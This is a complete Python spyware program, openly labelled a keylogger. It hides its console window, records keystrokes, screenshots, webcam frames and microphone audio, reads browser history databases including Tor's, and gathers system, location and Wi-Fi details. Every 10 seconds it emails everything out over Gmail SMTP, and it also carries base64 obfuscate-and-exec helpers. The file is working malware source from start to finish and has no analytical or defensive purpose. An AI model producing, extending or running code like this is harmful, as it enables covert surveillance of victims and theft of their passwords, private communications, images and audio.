#!/usr/bin/env python

import os
import platform
import psutil
import socket
import requests
import sqlite3
import smtplib
import threading
import pynput
import pyautogui
import cv2
import sounddevice as sd
import wave
import io
import tempfile
import time
import ctypes
import base64
import subprocess
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email import encoders
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Get sensitive data from environment variables
EMAIL = os.getenv('EMAIL')
PASSWORD = os.getenv('PASSWORD')

def obfuscate_code(code):
    encoded_code = base64.b64encode(code.encode()).decode()
    return encoded_code

def execute_obfuscated_code(encoded_code):
    decoded_code = base64.b64decode(encoded_code).decode()
    exec(decoded_code)

class KeyLogger:
    def __init__(self, time_interval: int) -> None:
        self.interval = time_interval
        self.log = "KeyLogger has started..."
        self.browser_log_file = tempfile.NamedTemporaryFile(delete=False, suffix='.txt').name
        self.stealth_mode()

    def stealth_mode(self):
        try:
            if platform.system() == "Windows":
                whnd = ctypes.windll.kernel32.GetConsoleWindow()
                if whnd != 0:
                    ctypes.windll.user32.ShowWindow(whnd, 0)
                    ctypes.windll.kernel32.CloseHandle(whnd)
        except Exception as e:
            print(f"Stealth mode failed: {str(e)}")

    def append_to_log(self, string: str):
        assert isinstance(string, str)
        self.log = self.log + string

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print("Exiting program...")
                return False
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def capture_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            with io.BytesIO() as output:
                screenshot.save(output, format="PNG")
                return output.getvalue()
        except Exception as e:
            print(f"Error capturing screenshot: {str(e)}")
            return None

    def capture_camera_image(self):
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                raise Exception("Could not open video device")
            ret, frame = cap.read()
            cap.release()
            if not ret:
                raise Exception("Could not read frame from video device")
            _, buffer = cv2.imencode('.jpg', frame)
            return buffer.tobytes()
        except Exception as e:
            print(f"Error capturing camera image: {str(e)}")
            return None

    def record_audio(self, duration: int) -> bytes:
        try:
            samplerate = 44100
            recording = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=2, dtype='int16')
            sd.wait()
            with io.BytesIO() as wav_buffer:
                with wave.open(wav_buffer, 'wb') as wav_file:
                    wav_file.setnchannels(2)
                    wav_file.setsampwidth(2)
                    wav_file.setframerate(samplerate)
                    wav_file.writeframes(recording.tobytes())
                    wav_buffer.seek(0)
                    return wav_buffer.read()
        except Exception as e:
            print(f"Error recording audio: {str(e)}")
            return None

    def get_system_info(self) -> str:
        try:
            system_info = []
            system_info.append(f"Hostname: {socket.gethostname()}")
            system_info.append(f"IP Address: {socket.gethostbyname(socket.gethostname())}")
            system_info.append(f"System: {platform.system()}")
            system_info.append(f"Node Name: {platform.node()}")
            system_info.append(f"Release: {platform.release()}")
            system_info.append(f"Version: {platform.version()}")
            system_info.append(f"Machine: {platform.machine()}")
            system_info.append(f"Processor: {platform.processor()}")
            system_info.append(f"CPU Cores: {psutil.cpu_count(logical=False)}")
            system_info.append(f"Logical CPUs: {psutil.cpu_count(logical=True)}")
            system_info.append(f"CPU Frequency: {psutil.cpu_freq().current} MHz")
            system_info.append(f"Memory: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB")
            system_info.append(f"Disk Usage: {round(psutil.disk_usage('/').percent, 2)}%")
            system_info.append(f"User Information: {os.getlogin()}")
            return "\n".join(system_info)
        except Exception as e:
            return f"Error getting system info: {str(e)}"

    def get_geolocation(self) -> str:
        try:
            ip_info = requests.get('https://ipinfo.io/json').json()
            location = ip_info.get('loc', 'Unavailable')
            city = ip_info.get('city', 'Unavailable')
            region = ip_info.get('region', 'Unavailable')
            country = ip_info.get('country', 'Unavailable')
            return f"Location: {location}\nCity: {city}\nRegion: {region}\nCountry: {country}"
        except requests.RequestException as e:
            return f"Geolocation information could not be retrieved: {str(e)}"

    def capture_browser_activity(self):
        try:
            browsers = {
                "Brave": os.path.expanduser("~") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History",
                "Chrome": os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/History",
                "Edge": os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data/Default/History",
                "Firefox": os.path.expanduser("~") + "/AppData/Roaming/Mozilla/Firefox/Profiles/your_profile_name/places.sqlite",
                "Tor": os.path.expanduser("~") + "/AppData/Roaming/Tor Browser/Browser/TorBrowser/Data/Browser/profile.default/places.sqlite",
                "Opera": os.path.expanduser("~") + "/AppData/Roaming/Opera Software/Opera Stable/History"
            }

            with open(self.browser_log_file, "w") as log_file:
                for browser, path in browsers.items():
                    if os.path.exists(path):
                        try:
                            conn = sqlite3.connect(path)
                            cursor = conn.cursor()
                            cursor.execute("SELECT url, title, visit_count FROM urls")
                            urls = cursor.fetchall()
                            log_file.write(f"\n{browser} Activity:\n")
                            for url in urls:
                                log_file.write(f"Title: {url[1]}, URL: {url[0]}, Visit Count: {url[2]}\n")
                            conn.close()
                        except Exception as e:
                            log_file.write(f"Error extracting {browser} URLs: {str(e)}\n")
                    else:
                        log_file.write(f"{browser} history file not found.\n")
        except Exception as e:
            with open(self.browser_log_file, "w") as log_file:
                log_file.write(f"Error capturing browser activity: {str(e)}\n")

    def get_network_info(self) -> str:
        network_info = []
        try:
            system = platform.system()
            
            # Collect network interfaces
            interfaces = psutil.net_if_addrs()
            for interface_name, addresses in interfaces.items():
                network_info.append(f"Network Interface: {interface_name}")
                for address in addresses:
                    network_info.append(f"  Address: {address.address}")
                    network_info.append(f"  Netmask: {address.netmask}")
                    network_info.append(f"  Broadcast: {address.broadcast}")
                network_info.append("")

            # Collect Wi-Fi SSID
            if system == "Windows":
                try:
                    result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True, encoding='utf-8')
                    ssid = None
                    for line in result.stdout.splitlines():
                        if "SSID" in line:
                            ssid = line.split(":")[1].strip()
                            break
                    network_info.append(f"Wi-Fi SSID: {ssid if ssid else 'Unavailable'}")
                except Exception as e:
                    network_info.append(f"Error retrieving Wi-Fi SSID: {str(e)}")

            elif system == "Linux":
                try:
                    result = subprocess.run(['iwgetid', '-r'], capture_output=True, text=True)
                    network_info.append(f"Wi-Fi SSID: {result.stdout.strip() if result.stdout else 'Unavailable'}")
                except Exception as e:
                    network_info.append(f"Error retrieving Wi-Fi SSID: {str(e)}")

            elif system == "Darwin":
                try:
                    result = subprocess.run(['networksetup', '-getairportnetwork', 'en0'], capture_output=True, text=True, encoding='utf-8')
                    network_info.append(f"Wi-Fi SSID: {result.stdout.split(': ')[1].strip() if 'SSID' in result.stdout else 'Unavailable'}")
                except Exception as e:
                    network_info.append(f"Error retrieving Wi-Fi SSID: {str(e)}")

            else:
                network_info.append("Wi-Fi SSID retrieval not supported for this OS")

            return "\n".join(network_info)
        except Exception as e:
            return f"Error retrieving network information: {str(e)}"

    def send_email(self):
        try:
            message = MIMEMultipart()
            message['From'] = EMAIL
            message['To'] = EMAIL
            message['Subject'] = "Keylogger Report"

            # Email body
            body = f"Logged Keystrokes:\n{self.log}\n\n"
            body += f"System Info:\n{self.get_system_info()}\n\n"
            body += f"Geolocation Info:\n{self.get_geolocation()}\n\n"
            body += f"Network Info:\n{self.get_network_info()}\n\n"
            message.attach(MIMEText(body, 'plain'))

            # Attach screenshot
            screenshot = self.capture_screenshot()
            if screenshot:
                image = MIMEImage(screenshot, name='screenshot.png')
                message.attach(image)

            # Attach camera image
            camera_image = self.capture_camera_image()
            if camera_image:
                image = MIMEImage(camera_image, name='camera_image.jpg')
                message.attach(image)

            # Attach audio recording
            audio = self.record_audio(duration=10)
            if audio:
                audio_attachment = MIMEAudio(audio, name='audio.wav')
                message.attach(audio_attachment)

            # Attach browser activity log
            self.capture_browser_activity()
            with open(self.browser_log_file, "rb") as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(self.browser_log_file)}')
                message.attach(part)

            # Send the email
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(EMAIL, PASSWORD)
                server.sendmail(EMAIL, EMAIL, message.as_string())
                print(f"Email sent successfully at {time.strftime('%Y-%m-%d %H:%M:%S')}")

        except Exception as e:
            print(f"Error sending email: {str(e)}")

    def start(self):
        listener = pynput.keyboard.Listener(on_press=self.on_press)
        listener.start()
        while True:
            time.sleep(self.interval)
            self.send_email()

if __name__ == "__main__":
    keylogger = KeyLogger(time_interval=10)  # Set interval in seconds
    keylogger.start()
